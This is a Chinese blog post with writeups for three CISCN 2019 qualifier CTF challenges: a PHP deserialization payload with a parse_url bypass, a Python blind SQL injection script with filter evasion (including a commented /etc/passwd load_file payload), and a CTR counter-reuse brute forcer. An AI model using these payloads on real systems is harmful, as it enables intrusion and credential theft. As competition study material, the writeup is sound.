---
title: Ciscn 2019 初赛 Writeup
date: 2019-04-25 00:23:14
tags: [writeup]
---

输出了两题 web + 一题 crypto, 太菜了 QAQ  
因为也是要交上去的, 就写的比较简单了.  

<!--more-->

## JustSoso

根据html内的提示, `php://filter/read=convert.base64-encode/resource=index.php`  
和 `php://filter/read=convert.base64-encode/resource=hint.php` 得到源码,  
之后代码审计.  

1. 通过 ///index.php 使 parse_url 返回 false, 绕过 payload 内不能有 flag 的限制
2. 通过引用的方式, 绕过 $this->token === $this->token_flag
3. 将序列化后的字符串 `"Handle":1` 的改为 2, 使其反序列时不调用 __wakeup 魔术方法, 让 handler 正常调用

最后 payload:  
`http://fe95bbad6a4f406cbd981c3496fb83f2be3784a02dfb46d1.changame.ichunqiu.com///index.php?file=hint.php&payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22token_flag%22%3Bs%3A32%3A%226754e06e46dfa419d5afe3c9781cecad%22%3Bs%3A5%3A%22token%22%3BR%3A4%3B%7D%7D`


## 全宇宙最简单的SQL

尝试 `admin'asdasd` 返回数据库操作失败, 说明存在注入漏洞,  
尝试盲注但是发现 `benchmark` 和 `sleep` 全部被替换为 `QwQ`, 随即尝试布尔注入,  
发现 `if` 和 `case` 也被过滤. 最后用短路求值的方式代替 if, 并用 `exp(710)` 产生错误,  
如果前面语句返回 true, 将返回数据库操作失败, 如果前面语句返回 false, 返回账号登录失败. 且表名为常见名称 user,  
列名通过虚表的方式绕过.

```python
import requests
import string
from tqdm import tqdm
# url = "http://0d3316846cd2408dbfdf95808c03f3f5714e7d9655ee4d4e.changame.ichunqiu.com/"
url = "http://106.119.182.216/"
# username=asd'/**/and/**/1=(SELECT/**/database()/**/like/**/'z')/**/and/**/exp(710)#&password=admin
sess = requests.session()
sess.headers["Host"] = "0d3316846cd2408dbfdf95808c03f3f5714e7d9655ee4d4e.changame.ichunqiu.com"
# database: ctf
# table: user
# 2 col
# /fll1llag_h3r3 2,F1AG@1s-at_/fll1llag_h3r3
# f"asd'/**/and/**/1=(SELECT/**/version()/**/like/**/'{i}')/**/and/**/exp(710)#",
# asd'/**/and/**/1=(select(SELECT/**/group_concat(`1`)/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/user)asd)/**/like/**/'a%')/**/and/**/exp(710)#
# f"asd'/**/and/**/1=(select(SELECT/**/hex(group_concat(`2`))/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/user)asd)/**/like/**/'{tmp}%')/**/and/**/exp(710)#",
# f"asd'/**/and/**/1=(select/**/load_file(0x2f6574632f706173737764)/**/like/**/'{tmp}')/**/and/**/exp(710)#",
#table = string.printable[:-5]
#table = table.replace("%", '')
#table = table.replace("'", "")
#table = table.replace("\\", "")
table = "0123456789ABCDEF"
curr = ''
for _ in range(999):
    for i in tqdm(table):
        tmp = curr + i + "%"
        data = {
            "username": f"asd'/**/and/**/1=(select(SELECT/**/hex(group_concat(`2`))/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/user)asd)/**/like/**/'{tmp}%')/**/and/**/exp(710)#",
            "password": "admin"
        }
        success = False
        while not success:
            try:
                res = sess.post(url, data, timeout=2)
                success = True
            except Exception:
                pass
        res = res.content
        res = res.decode('utf-8')
        if "数据库操作" in res:
            curr += i
            print(curr)
            break
        if i == table[-1]:
            raise Exception
```
![](https://i.loli.net/2019/04/25/5cc08eb862dd6.png)

最后得到 admin 的密码为 `F1AG@1s-at_/fll1llag_h3r3`, 尝试直接 load_file读取失败.  
应该是没有权限, 随即在web上尝试登录admin, 发现是 mysql 客户端连接并执行语句的服务.  
猜测有客户端读任意文件的漏洞, 可以直接拿到flag文件.

![](https://i.loli.net/2019/04/25/5cc08eb884ce6.png)
![](https://i.loli.net/2019/04/25/5cc08eb889b62.png)


## warmup

题目采用的是 CTR 模式, 而且每次加密采用同一计数器,  
只要第一次发送空, 之后每次爆破一位比对是否与第一次对应位置的值相同即可.  

```python
from remoteCLI import CLI
from binascii import unhexlify
import string
from tqdm import tqdm

result = r'result>([0-9a-f]{0,})'

cli = CLI()
cli.connect("fc32f84bc46ac22d97e5f876e3100922.kr-lab.com", 12345)
cli.sendLine('')
res = cli.recvUntilFind(result)[0]
flag = unhexlify(res)
flagLen = len(flag)
table = string.printable[:-5]
curr = ''
for seq in range(flagLen):
    for i in tqdm(table):
        cli.sendLine(curr + i)
        res = cli.recvUntilFind(result)[0]
        res = unhexlify(res)
        if res[seq] == flag[seq]:
            curr += i
            print(curr)
            break
```